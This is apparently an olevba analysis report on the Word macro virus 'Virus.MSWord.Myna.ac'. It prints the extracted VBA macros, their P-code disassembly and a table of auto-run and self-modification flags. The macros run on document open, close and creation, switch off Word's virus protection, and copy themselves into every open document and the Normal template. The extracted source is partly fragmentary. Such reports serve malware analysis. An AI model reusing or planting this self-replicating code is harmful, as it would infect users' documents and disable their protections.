olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Myna.ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Myna.ac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Close()
    On Error Resume Next
    Options.VirusProtection = False
    EnableCancelKey = wdCancelDisabled
    Set maci = MacroContainer.VBProject.VBComponents.Item(1)
    Set macic = maci.codemodule
    ns$ = Left(macic.Lines(1, 1), 21)
    Set inf = NormalTemplate: nsi$ = ns$ + "Close()"
        If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + "Open()"
    Set infc = inf.VBProject.VBComponents
    Set infi = infc.Item(1)
    Set infic = infi.codemodule
    infi.Name = "ThisDocument"
    For mx = 2 To infc.Count
        infc.Remove infc.Item(2)
    Next mx
        If infic.countlines <> macic.countoflines Then
            infic.deletelines 1, infic.countoflines
            For coco = 1 To macic.countoflines

Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
Next
End If
End Sub

Private Sub Document_New()
'
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 Options.VirusProtection = False
 answer = "MYNAMEISVIRUS"
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
Next
End If
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If

    End If
Next
End Sub

Private Sub Document_Open()
Dim aready As Boolean
Dim star As Long
Dim send As Long
Dim answer As String
Dim path$
 answer = "MYNAMEISVIRUS"
  Options.VirusProtection = False
star = 1
send = 1
path$ = Options.DefaultFilePath(wdUserTemplatesPath)
If Count <> 1 Then
  Count = Count + 1
 ' Documents.Add
End If
If Documents.Count <> 0 Then
For i = 1 To Documents.Count
For Each xitem In Documents(i).VBProject.VBComponents
   ' If xitem.Name = "NewMacros" Then
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
  For Each xitem In NormalTemplate.VBProject.VBComponents
    If xitem.Name = "ThisDocument" Then
    send = xitem.codemodule.countoflines
    aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
    If aready = False Then
          With xitem.codemodule
             .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
         End With
    End If
    End If
Next
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Myna.ac
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8254 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	Ld wdCancelDisabled 
' 	St EnableCancelKey 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set maci 
' Line #7:
' 	SetStmt 
' 	Ld maci 
' 	MemLd codemodule 
' 	Set macic 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0015 
' 	ArgsLd LBound 0x0002 
' 	St ns$ 
' Line #9:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	LitStr 0x0007 "Close()"
' 	Add 
' 	St nsi$ 
' Line #10:
' 	Ld MacroContainer 
' 	Ld inf 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set inf 
' 	BoS 0x0000 
' 	Ld ns$ 
' 	LitStr 0x0006 "Open()"
' 	Add 
' 	St nsi$ 
' 	EndIf 
' Line #11:
' 	SetStmt 
' 	Ld inf 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infc 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Set infi 
' Line #13:
' 	SetStmt 
' 	Ld infi 
' 	MemLd codemodule 
' 	Set infic 
' Line #14:
' 	LitStr 0x000C "ThisDocument"
' 	Ld infi 
' 	MemSt New 
' Line #15:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld infc 
' 	MemLd Count 
' 	For 
' Line #16:
' 	LitDI2 0x0002 
' 	Ld infc 
' 	ArgsMemLd Item 0x0001 
' 	Ld infc 
' 	ArgsMemCall Remove 0x0001 
' Line #17:
' 	StartForVariable 
' 	Ld mx 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	Ld infic 
' 	MemLd countlines 
' 	Ld macic 
' 	MemLd countoflines 
' 	Ne 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld infic 
' 	MemLd countoflines 
' 	Ld infic 
' 	ArgsMemCall deletelines 0x0002 
' Line #20:
' 	StartForVariable 
' 	Ld coco 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld macic 
' 	MemLd countoflines 
' 	For 
' Line #21:
' Line #22:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #23:
' 	Dim 
' 	VarDefn star (As Long)
' Line #24:
' 	Dim 
' 	VarDefn send (As Long)
' Line #25:
' 	Dim 
' 	VarDefn answer (As String)
' Line #26:
' 	Dim 
' 	VarDefn path
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #29:
' 	LitDI2 0x0001 
' 	St star 
' Line #30:
' 	LitDI2 0x0001 
' 	St send 
' Line #31:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #32:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #34:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #35:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #36:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #38:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #39:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #41:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #42:
' 	EndWith 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	StartForVariable 
' 	Next 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #49:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #51:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #52:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #54:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #55:
' 	EndWith 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	StartForVariable 
' 	Next 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Private Sub Document_New())
' Line #65:
' 	QuoteRem 0x0000 0x0000 ""
' Line #66:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #67:
' 	Dim 
' 	VarDefn star (As Long)
' Line #68:
' 	Dim 
' 	VarDefn send (As Long)
' Line #69:
' 	Dim 
' 	VarDefn answer (As String)
' Line #70:
' 	Dim 
' 	VarDefn path
' Line #71:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #72:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #73:
' 	LitDI2 0x0001 
' 	St star 
' Line #74:
' 	LitDI2 0x0001 
' 	St send 
' Line #75:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #76:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #77:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #78:
' 	QuoteRem 0x0001 0x000E " Documents.Add"
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #81:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #82:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #83:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #84:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #85:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #86:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #87:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #88:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #89:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #90:
' 	EndWith 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	StartForVariable 
' 	Next 
' Line #94:
' 	StartForVariable 
' 	Next 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #97:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #98:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #99:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #100:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #101:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #102:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #103:
' 	EndWith 
' Line #104:
' 	EndIfBlock 
' Line #105:
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	StartForVariable 
' 	Next 
' Line #108:
' 	EndSub 
' Line #109:
' Line #110:
' 	FuncDefn (Private Sub Document_Open())
' Line #111:
' 	Dim 
' 	VarDefn aready (As Boolean)
' Line #112:
' 	Dim 
' 	VarDefn star (As Long)
' Line #113:
' 	Dim 
' 	VarDefn send (As Long)
' Line #114:
' 	Dim 
' 	VarDefn answer (As String)
' Line #115:
' 	Dim 
' 	VarDefn path
' Line #116:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	St answer 
' Line #117:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #118:
' 	LitDI2 0x0001 
' 	St star 
' Line #119:
' 	LitDI2 0x0001 
' 	St send 
' Line #120:
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St path$ 
' Line #121:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #122:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #123:
' 	QuoteRem 0x0001 0x000E " Documents.Add"
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #127:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #128:
' 	QuoteRem 0x0003 0x0021 " If xitem.Name = "NewMacros" Then"
' Line #129:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #130:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #131:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld star 
' 	Ld send 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #132:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #133:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #134:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #135:
' 	EndWith 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	StartForVariable 
' 	Next 
' Line #139:
' 	StartForVariable 
' 	Ld xitem 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #140:
' 	Ld xitem 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	IfBlock 
' Line #141:
' 	Ld xitem 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St send 
' Line #142:
' 	LitStr 0x000D "MYNAMEISVIRUS"
' 	Ld star 
' 	LitDI2 0x0001 
' 	Ld send 
' 	LitDI2 0x0001 
' 	Ld xitem 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St aready 
' Line #143:
' 	Ld aready 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #144:
' 	StartWithExpr 
' 	Ld xitem 
' 	MemLd codemodule 
' 	With 
' Line #145:
' 	Ld star 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith insertlines 0x0002 
' 	QuoteRem 0x0063 0x0032 "codemodule.procbodyline("Autoexec", vbext_pk_Proc)"
' Line #146:
' 	EndWith 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	StartForVariable 
' 	Next 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

